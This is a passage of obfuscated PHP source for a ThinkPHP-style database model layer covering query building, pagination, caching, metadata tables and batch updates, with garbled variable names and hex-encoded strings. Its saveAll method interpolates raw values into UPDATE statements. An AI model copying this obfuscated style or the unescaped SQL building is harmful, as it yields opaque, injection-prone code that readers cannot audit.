(is_string($†é€¸¥ô)) { parse_str($†é€¸¥ô, $†é€¸¥ô); } foreach ($†é€¸¥ô as $Ù‘Üå–ü => $ö®¡©ú) { $this->setProperty($Ù‘Üå–ü, $ö®¡©ú); } } $±çà¹±ã[$ßûïÚ] = $¾½°í¿á; $this->db = $êìòÅ™İ[$ßûïÚ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $­ïÁ¥‚ = get_class($this); if ($­ïÁ¥‚ == $_SERVER[ë¦»ºéÌ][352]) { return $this->name; } $this->name = substr($­ïÁ¥‚, 0, -5); } return $this->name; } public function getTableName() { $ò³ÕìÆâ =& $_SERVER[ë¦»ºéÌ]; if (empty($this->trueTableName)) { $Ì†¯øÒâ = !empty($this->tablePrefix) ? $this->tablePrefix : $ò³ÕìÆâ[12]; if (!empty($this->tableName)) { $Ì†¯øÒâ .= $this->tableName; } else { $Ì†¯øÒâ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ì†¯øÒâ); } return (!empty($this->dbName) ? $this->dbName . $ò³ÕìÆâ[10] : $ò³ÕìÆâ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Î‡¡ıó =& $_SERVER[ë¦»ºéÌ]; return isset($this->fields[$Î‡¡ıó[257]]) ? $this->fields[$Î‡¡ıó[257]] : $this->pk; } public function getDbFields() { $¦ãñŸÍ† =& $_SERVER[ë¦»ºéÌ]; if (isset($this->options[$¦ãñŸÍ†[285]])) { $ÙŸ†ÙÅ = $this->db->getFields($this->options[$¦ãñŸÍ†[285]]); return $ÙŸ†ÙÅ ? array_keys($ÙŸ†ÙÅ) : !1; } if ($this->fields) { $ÙŸ†ÙÅ = $this->fields; unset($ÙŸ†ÙÅ[$¦ãñŸÍ†[256]], $ÙŸ†ÙÅ[$¦ãñŸÍ†[257]], $ÙŸ†ÙÅ[$¦ãñŸÍ†[258]], $ÙŸ†ÙÅ[$¦ãñŸÍ†[255]]); return $ÙŸ†ÙÅ; } return !1; } public function data($°“û¼‰— = '') { $§Ü®­Šğ =& $_SERVER[ë¦»ºéÌ]; if ($§Ü®­Šğ[12] === $°“û¼‰— && !empty($this->data)) { return $this->data; } if (is_object($°“û¼‰—)) { $°“û¼‰— = get_object_vars($°“û¼‰—); } elseif (is_string($°“û¼‰—)) { parse_str($°“û¼‰—, $°“û¼‰—); } elseif (!is_array($°“û¼‰—)) { think_exception(think_lang($§Ü®­Šğ[277])); } $this->data = $°“û¼‰—; return $this; } public function join($‚é€¹¿í) { $¶Ãµ˜¿ =& $_SERVER[ë¦»ºéÌ]; if (is_array($‚é€¹¿í)) { $this->options[$¶Ãµ˜¿[288]] = $‚é€¹¿í; } elseif (!empty($‚é€¹¿í)) { $this->options[$¶Ãµ˜¿[288]][] = $‚é€¹¿í; } return $this; } public function union($š‰“Š¸É, $ëú®¥òÁ = false) { $š…³Ş­Ÿ =& $_SERVER[ë¦»ºéÌ]; if (empty($š‰“Š¸É)) { return $this; } if ($ëú®¥òÁ) { $this->options[$š…³Ş­Ÿ[353]][$š…³Ş­Ÿ[354]] = !0; } if (is_object($š‰“Š¸É)) { $š‰“Š¸É = get_object_vars($š‰“Š¸É); } if (is_string($š‰“Š¸É)) { $Ó¡¸ÕáÃ = $š‰“Š¸É; } elseif (is_array($š‰“Š¸É)) { if (isset($š‰“Š¸É[0])) { $this->options[$š…³Ş­Ÿ[353]] = array_merge($this->options[$š…³Ş­Ÿ[353]], $š‰“Š¸É); return $this; } else { $Ó¡¸ÕáÃ = $š‰“Š¸É; } } else { think_exception(think_lang($š…³Ş­Ÿ[277])); } $this->options[$š…³Ş­Ÿ[353]][] = $Ó¡¸ÕáÃ; return $this; } public function cache($Í ‰Ë·û = true, $Òáü°…é = null, $ÕİºË¾ = '') { $¸¬ì¿­« =& $_SERVER[ë¦»ºéÌ]; if (!1 !== $Í ‰Ë·û) { $this->options[$¸¬ì¿­«[355]] = array($¸¬ì¿­«[105] => $Í ‰Ë·û, $¸¬ì¿­«[345] => $Òáü°…é, $¸¬ì¿­«[43] => $ÕİºË¾); } return $this; } public function field($±º¦úĞó, $ë‚æÎ‘ = false) { $Ç—è›Œ½ =& $_SERVER[ë¦»ºéÌ]; if (!0 === $±º¦úĞó) { $¹¬½¹Î– = $this->getDbFields(); $±º¦úĞó = $¹¬½¹Î– ? $¹¬½¹Î– : $Ç—è›Œ½[193]; } elseif ($ë‚æÎ‘) { if (is_string($±º¦úĞó)) { $±º¦úĞó = explode($Ç—è›Œ½[60], $±º¦úĞó); } $¹¬½¹Î– = $this->getDbFields(); $±º¦úĞó = $¹¬½¹Î– ? array_diff($¹¬½¹Î–, $±º¦úĞó) : $±º¦úĞó; } $this->options[$Ç—è›Œ½[279]] = $±º¦úĞó; return $this; } public function scope($Ø‰Ä¼‡ = '', $“Ùôï¾Ş = NULL) { $®Ü»ñÑ‚ =& $_SERVER[ë¦»ºéÌ]; if ($®Ü»ñÑ‚[12] === $Ø‰Ä¼‡) { if (isset($this->_scope[$®Ü»ñÑ‚[47]])) { $†»ñ·¿Í = $this->_scope[$®Ü»ñÑ‚[47]]; } else { return $this; } } elseif (is_string($Ø‰Ä¼‡)) { $±»›½Ç¬ = explode($®Ü»ñÑ‚[60], $Ø‰Ä¼‡); $†»ñ·¿Í = array(); foreach ($±»›½Ç¬ as $ØîğÆ†¸) { if (!isset($this->_scope[$ØîğÆ†¸])) { continue; } $†»ñ·¿Í = array_merge($†»ñ·¿Í, $this->_scope[$ØîğÆ†¸]); } if (!empty($“Ùôï¾Ş) && is_array($“Ùôï¾Ş)) { $†»ñ·¿Í = array_merge($†»ñ·¿Í, $“Ùôï¾Ş); } } elseif (is_array($Ø‰Ä¼‡)) { $†»ñ·¿Í = $Ø‰Ä¼‡; } if (is_array($†»ñ·¿Í) && !empty($†»ñ·¿Í)) { $this->options = array_merge($this->options, array_change_key_case($†»ñ·¿Í)); } return $this; } public function where($­€Íñ¡, $ëÍô×êÏ = null) { $±Ò©À ¦ =& $_SERVER[ë¦»ºéÌ]; if (!is_null($ëÍô×êÏ) && is_string($­€Íñ¡)) { if (!is_array($ëÍô×êÏ)) { $ëÍô×êÏ = func_get_args(); array_shift($ëÍô×êÏ); } $ëÍô×êÏ = array_map(array($this->db, $±Ò©À ¦[349]), $ëÍô×êÏ); $­€Íñ¡ = vsprintf($­€Íñ¡, $ëÍô×êÏ); } elseif (is_object($­€Íñ¡)) { $­€Íñ¡ = get_object_vars($­€Íñ¡); } elseif (is_array($­€Íñ¡)) { foreach ($­€Íñ¡ as $ÆœÙà”Ú => $Ú›¯¸¶) { if ((is_numeric($ÆœÙà”Ú) || !$ÆœÙà”Ú) && is_string($Ú›¯¸¶)) { if (strpos($Ú›¯¸¶, $±Ò©À ¦[356]) === 0) { continue; } think_trace($±Ò©À ¦[357], $±Ò©À ¦[12], $±Ò©À ¦[59]); die; } } } if (is_string($­€Íñ¡) && $±Ò©À ¦[12] != $­€Íñ¡) { $¢ÖŒ“˜Í = array(); $¢ÖŒ“˜Í[$±Ò©À ¦[358]] = $­€Íñ¡; $­€Íñ¡ = $¢ÖŒ“˜Í; } if (isset($this->options[$±Ò©À ¦[281]])) { $this->options[$±Ò©À ¦[281]] = array_merge($this->options[$±Ò©À ¦[281]], $­€Íñ¡); } else { $this->options[$±Ò©À ¦[281]] = $­€Íñ¡; } return $this; } public function limit($¼¤‡ ’¢, $Ú…áƒ‰ = null) { $íş ¯Ô§ =& $_SERVER[ë¦»ºéÌ]; $this->options[$íş ¯Ô§[298]] = is_null($Ú…áƒ‰) ? $¼¤‡ ’¢ : $¼¤‡ ’¢ . $íş ¯Ô§[60] . $Ú…áƒ‰; return $this; } public function page($íÇÕüˆÃ, $‹Áñ×¦³ = null) { $ÓÖ¬¼è =& $_SERVER[ë¦»ºéÌ]; $this->options[$ÓÖ¬¼è[359]] = is_null($‹Áñ×¦³) ? $íÇÕüˆÃ : $íÇÕüˆÃ . $ÓÖ¬¼è[60] . $‹Áñ×¦³; return $this; } public function comment($È­­İä) { $this->options[$_SERVER[ë¦»ºéÌ][360]] = $È­­İä; return $this; } public function setProperty($¦‰¿ğ¶å, $õ¦ñİì) { if (property_exists($this, $¦‰¿ğ¶å)) { $this->{$¦‰¿ğ¶å} = $õ¦ñİì; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\x72\x74\x2c\x75\x70\144\x61\164\145", "\146\x75\156\143\x74\x69\x6f\156"), array("\x63\x72\x65\141\x74\x65\124\151\155\145", "\164\151\155\x65", "\151\156\163\145\x72\164", "\x66\165\x6e\143\164\151\x6f\156")); public function setDataAuto($ÄÉß‰•¾) { $this->dataAuto = $ÄÉß‰•¾; } public function __construct($–‰ù‚™Ä = '', $Ä¢¤˜ï = '', $ÀíÛ«¾Î = '') { parent::__construct($–‰ù‚™Ä, $Ä¢¤˜ï, $ÀíÛ«¾Î); } protected $tableMeta = array(); protected function _beforeInsert(&$´í³–í¤, $ØôÔğ¿Í) { $Ğ©Ğñ®ë =& $_SERVER[ë¦»ºéÌ]; if (!$this->checkDataAutoHas($Ğ©Ğñ®ë[361])) { return; } $this->dataBeforeFilter($´í³–í¤, $Ğ©Ğñ®ë[361]); } protected function _beforeUpdate(&$³Ûİ¢€î, $Ìø¶¡’æ) { $ËâÊç·¾ =& $_SERVER[ë¦»ºéÌ]; if (!$this->checkDataAutoHas($ËâÊç·¾[362])) { return; } $this->dataBeforeFilter($³Ûİ¢€î, $ËâÊç·¾[362]); } protected function _afterSelect(&$ÏÄë˜¼Ú, $ôŸ µ±‚) { if (!is_array($ÏÄë˜¼Ú)) { return; } if (!$this->checkDataAutoHas($_SERVER[ë¦»ºéÌ][363])) { return; } foreach ($ÏÄë˜¼Ú as &$ª½Á©†÷) { $this->dataAfterFilter($ª½Á©†÷); } unset($ª½Á©†÷); } protected function _afterFind(&$úËê¬Ñ, $ÓÓÛÏõÑ) { if (!is_array($úËê¬Ñ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ë¦»ºéÌ][363])) { return; } $this->dataAfterFilter($úËê¬Ñ); } public static function textEncode($¤¢Óœ±Ú) { if (!$¤¢Óœ±Ú) { return $¤¢Óœ±Ú; } $ ÂøŸÉ = json_encode($¤¢Óœ±Ú); $ ÂøŸÉ = preg_replace_callback($_SERVER[ë¦»ºéÌ][364], function ($îŒ‰Şª ) { return addslashes($îŒ‰Şª [0]); }, $ ÂøŸÉ); return json_decode($ ÂøŸÉ); } public static function textDecode($¯ıì¾ç©) { $…¬¤Í‚ú =& $_SERVER[ë¦»ºéÌ]; $ã¬’·ú = json_encode($¯ıì¾ç©); $ã¬’·ú = preg_replace_callback($…¬¤Í‚ú[365], function ($×¹¡é«æ) { return $_SERVER[ë¦»ºéÌ][108]; }, $ã¬’·ú); return json_decode($ã¬’·ú); } public function setAutoIncrement($×ú‰è­¿) { $»Æ×Ò¿˜ = array($this->getPk() => $×ú‰è­¿); $şªÑ©åø = $this->data($»Æ×Ò¿˜)->add(); if ($şªÑ©åø) { $this->delete($şªÑ©åø); } } public function getAutoIncrement() { $äºÃ¶Æ‰ = $this->getTableName(); $æ¬äöÍ = $this->max($this->getPk()); $©¸ùÌœØ = $this->query("\163\150\157\x77\40\x74\141\x62\154\x65\40\x73\x74\141\164\165\x73\x20\167\150\x65\x72\145\x20\116\x61\155\x65\x3d\x27{$äºÃ¶Æ‰}\47"); $Ë«ë³ = $©¸ùÌœØ[0][$_SERVER[ë¦»ºéÌ][366]]; $ğŠæÔô× = max($æ¬äöÍ, $Ë«ë³); return $ğŠæÔô×; } protected function _callBefore($ü«™–ô¤, $¼‚Ææúç) { return $this->cacheCallCheck($ü«™–ô¤, $¼‚Ææúç, !1); } protected function _callAfter($Ì‹¥ó¢Ñ, $À¥¤«éå) { return $this->cacheCallCheck($Ì‹¥ó¢Ñ, $À¥¤«éå, !0); } protected function cacheFunctionAlias($èúïĞË) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¿¦—·İı, $¾ÒÌ¯³, $‚¢Å÷êü = false) { $¿ğ¸ûÜ = $this->cacheFunctionAlias($¾ÒÌ¯³); if (!$¿ğ¸ûÜ) { return; } foreach ($¿ğ¸ûÜ as $ı…ëúÉí => $ÃÓ‚ÆÛÑ) { $óºš€¦¾ = $ÃÓ‚ÆÛÑ[0]; $ÚÈìé¸½ = explode($_SERVER[ë¦»ºéÌ][60], $ÃÓ‚ÆÛÑ[1]); if ($¿¦—·İı == $ı…ëúÉí) { return $this->cacheFunctionGet($ı…ëúÉí, $óºš€¦¾); } if ($‚¢Å÷êü && in_array($¿¦—·İı, $ÚÈìé¸½)) { $this->cacheFunctionClear($ı…ëúÉí, $óºš€¦¾); } } } public function cacheFunctionGet($ÁÙÏ¦Ã¯, $ÁşÀÓ¨») { $È²ÈÉğ± = $this->cacheKeyMake($ÁÙÏ¦Ã¯, $ÁşÀÓ¨»); $Ø‹·ÒÆ¤ = Cache::get($È²ÈÉğ±); if (!is_array($Ø‹·ÒÆ¤)) { $Ø‹·ÒÆ¤ = call_user_func_array(array($this, $ÁÙÏ¦Ã¯), array($ÁşÀÓ¨», !0)); Cache::set($È²ÈÉğ±, $Ø‹·ÒÆ¤); } return $Ø‹·ÒÆ¤; } public function cacheFunctionClear($µ¾¶¡ù×, $¢¼àõø³) { $ŒÚ½œÉ– = $¢¼àõø³; if (!is_array($¢¼àõø³)) { $ŒÚ½œÉ– = array($¢¼àõø³); } foreach ($ŒÚ½œÉ– as $¯§£–éµ) { $Öî’‹¦ñ = $this->cacheKeyMake($µ¾¶¡ù×, $¯§£–éµ); Cache::remove($Öî’‹¦ñ); } } private function cacheKeyMake($Ëˆ¹¹‹–, $×Ô‰¶«) { $†ßµÛüÜ =& $_SERVER[ë¦»ºéÌ]; return get_class($this) . $†ßµÛüÜ[11] . $Ëˆ¹¹‹– . $†ßµÛüÜ[367] . $×Ô‰¶«; } protected function selectPageReset() { $Íê¹½ùØ =& $_SERVER[ë¦»ºéÌ]; if (isset($GLOBALS[$Íê¹½ùØ[368]])) { return; } $GLOBALS[$Íê¹½ùØ[368]] = isset($GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[369]]) ? $GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[369]] : !1; $GLOBALS[$Íê¹½ùØ[370]] = isset($GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[359]]) ? $GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[359]] : !1; $GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[369]] = !1; $GLOBALS[$Íê¹½ùØ[7]][$Íê¹½ùØ[359]] = !1; } protected function selectPageRestore() { $åêØäù› =& $_SERVER[ë¦»ºéÌ]; if (!isset($GLOBALS[$åêØäù›[368]])) { return; } $GLOBALS[$åêØäù›[7]][$åêØäù›[369]] = $GLOBALS[$åêØäù›[368]]; $GLOBALS[$åêØäù›[7]][$åêØäù›[359]] = $GLOBALS[$åêØäù›[370]]; if ($GLOBALS[$åêØäù›[7]][$åêØäù›[369]] === !1) { unset($GLOBALS[$åêØäù›[7]][$åêØäù›[369]]); } if ($GLOBALS[$åêØäù›[7]][$åêØäù›[359]] === !1) { unset($GLOBALS[$åêØäù›[7]][$åêØäù›[359]]); } unset($GLOBALS[$åêØäù›[368]]); unset($GLOBALS[$åêØäù›[370]]); } protected function selectPage($ï°ó²¢ = 200, $Õñ³²Áö = 1) { $„Ñ¬¬¦Ñ =& $_SERVER[ë¦»ºéÌ]; global $in; $Áèƒ£ç = $this->optionsValue(); $í¨ó‹™Ğ = 50000; $ï°ó²¢ = isset($in[$„Ñ¬¬¦Ñ[369]]) && $in[$„Ñ¬¬¦Ñ[369]] ? $in[$„Ñ¬¬¦Ñ[369]] : $ï°ó²¢; if ($ï°ó²¢ === -1) { $in[$„Ñ¬¬¦Ñ[369]] = !1; $í¨ó‹™Ğ = 100000000; $ï°ó²¢ = $í¨ó‹™Ğ; } $Ùï²ãÈğ = $Áèƒ£ç; $Ùï²ãÈğ[$„Ñ¬¬¦Ñ[371]] = array(); $ï°ó²¢ = intval($ï°ó²¢); $ï°ó²¢ = $ï°ó²¢ <= 5 ? 5 : ($ï°ó²¢ >= $í¨ó‹™Ğ ? $í¨ó‹™Ğ : $ï°ó²¢); $Õñ³²Áö = intval(isset($in[$„Ñ¬¬¦Ñ[359]]) && $in[$„Ñ¬¬¦Ñ[359]] ? $in[$„Ñ¬¬¦Ñ[359]] : $Õñ³²Áö); $Õñ³²Áö = $Õñ³²Áö <= 1 ? 1 : $Õñ³²Áö; $á­æÌ¥ = array(); $•Éıã§” = 1; if ($Õñ³²Áö == 1 && $•Éıã§”) { $this->optionsValue($Áèƒ£ç); $á­æÌ¥ = $this->page($Õñ³²Áö, $ï°ó²¢)->select(); $ô¦›­šµ = is_array($á­æÌ¥) ? count($á­æÌ¥) : 0; if ($ô¦›­šµ < $ï°ó²¢) { $ôæøŒö• = 1; } else { $this->optionsValue($Ùï²ãÈğ); $ô¦›­šµ = intval($this->count()); $ôæøŒö• = ceil($ô¦›­šµ / $ï°ó²¢); } } else { $this->optionsValue($Ùï²ãÈğ); $ô¦›­šµ = intval($this->count()); $ôæøŒö• = ceil($ô¦›­šµ / $ï°ó²¢); $Õñ³²Áö = $Õñ³²Áö >= $ôæøŒö• ? $ôæøŒö• : $Õñ³²Áö; $this->optionsValue($Áèƒ£ç); $á­æÌ¥ = $this->page($Õñ³²Áö, $ï°ó²¢)->select(); } if (!is_array($á­æÌ¥)) { $á­æÌ¥ = array(); } if ($ôæøŒö• == 1) { $ô¦›­šµ = count($á­æÌ¥); } $ïûÚÇĞ¹ = array($„Ñ¬¬¦Ñ[372] => array($„Ñ¬¬¦Ñ[373] => $ô¦›­šµ, $„Ñ¬¬¦Ñ[369] => $ï°ó²¢, $„Ñ¬¬¦Ñ[359] => $Õñ³²Áö, $„Ñ¬¬¦Ñ[374] => $ôæøŒö•), $„Ñ¬¬¦Ñ[375] => $á­æÌ¥); return $ïûÚÇĞ¹; } protected function checkLength($ã¤ºÏùÖ, $©àÓÜ¹Ì = 0, $Ïë²šøà = '') { $ˆ¢Œ²‡· =& $_SERVER[ë¦»ºéÌ]; $©àÓÜ¹Ì = $©àÓÜ¹Ì ? $©àÓÜ¹Ì : 65536; if (!$ã¤ºÏùÖ || strlen($ã¤ºÏùÖ) < $©àÓÜ¹Ì) { return; } $Ïë²šøà = $Ïë²šøà ? $Ïë²šøà . $ˆ¢Œ²‡·[81] : $ˆ¢Œ²‡·[12]; show_json($Ïë²šøà . LNG($ˆ¢Œ²‡·[376]) . "\50{$©àÓÜ¹Ì}\x29", !1); } protected function metaSet($í©¾¬, $Š±ÃùşÇ = null, $€¦ÃĞ† = null) { $î”æºıÀ =& $_SERVER[ë¦»ºéÌ]; if (!$this->tableMeta || !$í©¾¬) { return !1; } $˜´“Ğ‡² = $this->tableMeta[$î”æºıÀ[377]]; $ÊıÆ‘ÃĞ = $this->tableMeta[$î”æºıÀ[378]]; $–íÅ¢¡è = Model($ÊıÆ‘ÃĞ); $ëİÆà­Ñ = array($˜´“Ğ‡² => $í©¾¬, $î”æºıÀ[379] => $Š±ÃùşÇ); if (is_null($Š±ÃùşÇ)) { return $–íÅ¢¡è->where(array($˜´“Ğ‡² => $í©¾¬))->delete(); } if (is_null($€¦ÃĞ†) && is_string($Š±ÃùşÇ)) { return $–íÅ¢¡è->where($ëİÆà­Ñ)->delete(); } $¢û²üàµ = is_array($Š±ÃùşÇ) ? $Š±ÃùşÇ : array(); if (is_string($Š±ÃùşÇ)) { $¢û²üàµ[$Š±ÃùşÇ] = $€¦ÃĞ†; } $éƒòé¡Õ = array(); foreach ($¢û²üàµ as $Öáèò€ => $Õ†³ù°¢) { if (is_null($Õ†³ù°¢) && is_string($Öáèò€)) { $–íÅ¢¡è->where(array($˜´“Ğ‡² => $í©¾¬, $î”æºıÀ[379] => $Öáèò€))->delete(); continue; } $this->checkLength($Õ†³ù°¢, !1, $ÊıÆ‘ÃĞ . $î”æºıÀ[4] . $Öáèò€); $éƒòé¡Õ[] = array($˜´“Ğ‡² => $í©¾¬, $î”æºıÀ[105] => $Öáèò€, $î”æºıÀ[380] => $Õ†³ù°¢); } $÷ûì®«é = $î”æºıÀ[381] . $ÊıÆ‘ÃĞ; CacheLock::lock($÷ûì®«é); $–íÅ¢¡è->where(array($˜´“Ğ‡² => $í©¾¬))->addAll($éƒòé¡Õ, array(), !0); CacheLock::unlock($÷ûì®«é); return !0; } public function metaGet($°ºğÒ—ò, $ƒ¡÷ê”¤ = false) { $«­å½ëÏ =& $_SERVER[ë¦»ºéÌ]; if (!$this->tableMeta) { return array(); } $ÂÎÚíô = $this->tableMeta[$«­å½ëÏ[377]]; $ıĞ¼ìÜ¯ = Model($this->tableMeta[$«­å½ëÏ[378]]); if ($ƒ¡÷ê”¤) { $†‡®öø½ = array($ÂÎÚíô => $°ºğÒ—ò, $«­å½ëÏ[105] => $ƒ¡÷ê”¤); return $ıĞ¼ìÜ¯->where($†‡®öø½)->getField($«­å½ëÏ[380]); } $†‡®öø½ = array($ÂÎÚíô => $°ºğÒ—ò); $ˆÉ¶ŒÑ¨ = $ıĞ¼ìÜ¯->field($«­å½ëÏ[382])->where($†‡®öø½)->select(); $ˆÉ¶ŒÑ¨ = array_to_keyvalue($ˆÉ¶ŒÑ¨, $«­å½ëÏ[105], $«­å½ëÏ[380]); return $ˆÉ¶ŒÑ¨; } private function checkDataAutoHas($é±úÚÆ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¹§ÍäŸá) { if (in_array($é±úÚÆ, explode($_SERVER[ë¦»ºéÌ][60], $¹§ÍäŸá[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$í‡ÛàµÍ, $µí’¼Î±) { $ú˜‰™Ø =& $_SERVER[ë¦»ºéÌ]; if (!is_array($í‡ÛàµÍ)) { return; } foreach ($this->dataAuto as $ÈüûÌšê) { $îÌ²ğ’· = $ÈüûÌšê[0]; if (!in_array($µí’¼Î±, explode($ú˜‰™Ø[60], $ÈüûÌšê[2]))) { continue; } switch (trim($ÈüûÌšê[3])) { case $ú˜‰™Ø[327]: case $ú˜‰™Ø[328]: $êİ²Â•ª = $ÈüûÌšê[1]; $÷Ôóôï = isset($ÈüûÌšê[4]) ? (array) $ÈüûÌšê[4] : array(); if ($êİ²Â•ª == $ú˜‰™Ø[208] && array_key_exists($îÌ²ğ’·, $í‡ÛàµÍ)) { if (!$í‡ÛàµÍ[$îÌ²ğ’·]) { unset($í‡ÛàµÍ[$îÌ²ğ’·]); } break; } if (isset($í‡ÛàµÍ[$îÌ²ğ’·])) { array_unshift($÷Ôóôï, $í‡ÛàµÍ[$îÌ²ğ’·]); } if ($ú˜‰™Ø[327] == $ÈüûÌšê[3]) { $í‡ÛàµÍ[$îÌ²ğ’·] = call_user_func_array($êİ²Â•ª, $÷Ôóôï); } else { $í‡ÛàµÍ[$îÌ²ğ’·] = call_user_func_array(array(&$this, $êİ²Â•ª), $÷Ôóôï); } break; case $ú˜‰™Ø[276]: if (isset($í‡ÛàµÍ[$îÌ²ğ’·]) && $í‡ÛàµÍ[$îÌ²ğ’·]) { $í‡ÛàµÍ[$îÌ²ğ’·] = call_user_func_array(array(&$this, $ÈüûÌšê[1]), array($í‡ÛàµÍ[$îÌ²ğ’·])); } break; case $ú˜‰™Ø[279]: $í‡ÛàµÍ[$îÌ²ğ’·] = $í‡ÛàµÍ[$ÈüûÌšê[1]]; break; case $ú˜‰™Ø[300]: if (isset($í‡ÛàµÍ[$îÌ²ğ’·]) && !is_string($í‡ÛàµÍ[$îÌ²ğ’·])) { $í‡ÛàµÍ[$îÌ²ğ’·] = json_encode_force($í‡ÛàµÍ[$îÌ²ğ’·]); } break; case $ú˜‰™Ø[329]: if ($í‡ÛàµÍ[$îÌ²ğ’·] === $ú˜‰™Ø[12]) { unset($í‡ÛàµÍ[$îÌ²ğ’·]); } break; case $ú˜‰™Ø[330]: $í‡ÛàµÍ[$îÌ²ğ’·] = $ÈüûÌšê[1]; default: break; } } if ($µí’¼Î± == $ú˜‰™Ø[361]) { $ìë‡é÷¬ = strtolower($this->db->getDbType()); if (strpos($ìë‡é÷¬, $ú˜‰™Ø[23]) !== 0) { return; } $şôï• = $this->field(!0)->fields; $ıö›‡ĞÔ = $şôï•[$ú˜‰™Ø[258]]; if (isset($şôï•[$ú˜‰™Ø[257]])) { unset($ıö›‡ĞÔ[$şôï•[$ú˜‰™Ø[257]]]); } foreach ($ıö›‡ĞÔ as $ÇãñúùŠ => $µí’¼Î±) { if (!isset($í‡ÛàµÍ[$ÇãñúùŠ])) { $í‡ÛàµÍ[$ÇãñúùŠ] = $ú˜‰™Ø[12]; } } } } private function dataAfterFilter(&$ÍÎò½º) { $Ü—¦ŒÁ  =& $_SERVER[ë¦»ºéÌ]; foreach ($this->dataAuto as $œõ€±ğŸ) { $ãÙîàÚÍ = $œõ€±ğŸ[0]; if (!isset($ÍÎò½º[$ãÙîàÚÍ])) { continue; } if (!in_array($Ü—¦ŒÁ [363], explode($Ü—¦ŒÁ [60], $œõ€±ğŸ[2]))) { continue; } switch (trim($œõ€±ğŸ[3])) { case $Ü—¦ŒÁ [327]: case $Ü—¦ŒÁ [328]: $î¢¯ñŒ¹ = isset($œõ€±ğŸ[4]) ? (array) $œõ€±ğŸ[4] : array(); array_unshift($î¢¯ñŒ¹, $ÍÎò½º[$ãÙîàÚÍ]); if (isset($œõ€±ğŸ[4]) && $œõ€±ğŸ[4] == $Ü—¦ŒÁ [383]) { $î¢¯ñŒ¹ = array($ÍÎò½º[$ãÙîàÚÍ]); } if ($Ü—¦ŒÁ [327] == $œõ€±ğŸ[3]) { $ÍÎò½º[$ãÙîàÚÍ] = call_user_func_array($œõ€±ğŸ[1], $î¢¯ñŒ¹); } else { $ÍÎò½º[$ãÙîàÚÍ] = call_user_func_array(array(&$this, $œõ€±ğŸ[1]), $î¢¯ñŒ¹); } break; case $Ü—¦ŒÁ [276]: if (isset($ÍÎò½º[$ãÙîàÚÍ]) && $ÍÎò½º[$ãÙîàÚÍ]) { $ÍÎò½º[$ãÙîàÚÍ] = call_user_func_array(array(&$this, $œõ€±ğŸ[1]), array($ÍÎò½º[$ãÙîàÚÍ])); } break; case $Ü—¦ŒÁ [279]: $ÍÎò½º[$ãÙîàÚÍ] = $ÍÎò½º[$œõ€±ğŸ[1]]; break; case $Ü—¦ŒÁ [300]: $ÎááıÒË = $ÍÎò½º[$ãÙîàÚÍ]; $ÍÎò½º[$ãÙîàÚÍ] = json_decode($ÎááıÒË, !0); if (is_null($ÍÎò½º[$ãÙîàÚÍ])) { $ÍÎò½º[$ãÙîàÚÍ] = $ÎááıÒË; } break; case $Ü—¦ŒÁ [329]: if ($ÍÎò½º[$ãÙîàÚÍ] === $Ü—¦ŒÁ [12]) { unset($ÍÎò½º[$ãÙîàÚÍ]); } break; case $Ü—¦ŒÁ [330]: $ÍÎò½º[$ãÙîàÚÍ] = $œõ€±ğŸ[1]; break; default: break; } } } public function saveAll($é‡ûäùË) { $êà²…ÔÕ =& $_SERVER[ë¦»ºéÌ]; $œ»úõì = $this->tablePrefix . $this->tableName; $¯Üüºµ = self::SQL_WHERE_IN_CHUNK; $é‡ûäùË = is_array($é‡ûäùË) ? $é‡ûäùË : array(); $ü¥·ïÛ› = $êà²…ÔÕ[384]; $ïÇóğ·ã = 0; $Ôß¸¹¥¢ = array(); $¶‘ıßõ™ = count($é‡ûäùË); for ($èü±­–õ = 0; $èü±­–õ < $¶‘ıßõ™; $èü±­–õ++) { $Œƒ×éëé = $é‡ûäùË[$èü±­–õ]; if (!is_array($Œƒ×éëé) || count($Œƒ×éëé) != 4) { continue; } $Á…×ñä = "\x55\x50\104\101\x54\105\x20\140{$œ»úõì}\140\40\x53\x45\x54\x20{$Œƒ×éëé[2]}\40\x3d\x20\x43\101\123\x45\40{$Œƒ×éëé[0]}\x20\12"; if ($ïÇóğ·ã == 0) { $ü¥·ïÛ› = $Á…×ñä; } $Ôß¸¹¥¢[] = $êà²…ÔÕ[129] . $Œƒ×éëé[1] . $êà²…ÔÕ[129]; $ïÇóğ·ã++; $ü¥·ïÛ› .= "\40\127\110\105\x4e\x20\x27{$Œƒ×éëé[1]}\47\40\x54\110\x45\x4e\x20\47{$Œƒ×éëé[3]}\x27\x20\12"; if ($ïÇóğ·ã == $¯Üüºµ || $èü±­–õ == $¶‘ıßõ™ - 1) { $ÈºššúÁ = implode($êà²…ÔÕ[60], $Ôß¸¹¥¢); $ü¥·ïÛ› .= "\x20\105\116\104\40\x20\x57\110\x45\x52\x45\x20{$Œƒ×éëé[0]}\40\111\116\x20\x28{$ÈºššúÁ}\x29\x20"; $this->execute($ü¥·ïÛ›); $ïÇóğ·ã = 0; $ü¥·ïÛ› = $Á…×ñä; $this->chunkEventCheck(count($Ôß¸¹¥¢)); $Ôß¸¹¥¢ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ğš„¡±é) { $Æ¥Œ¦Öò =& $_SERVER[ë¦»ºéÌ]; 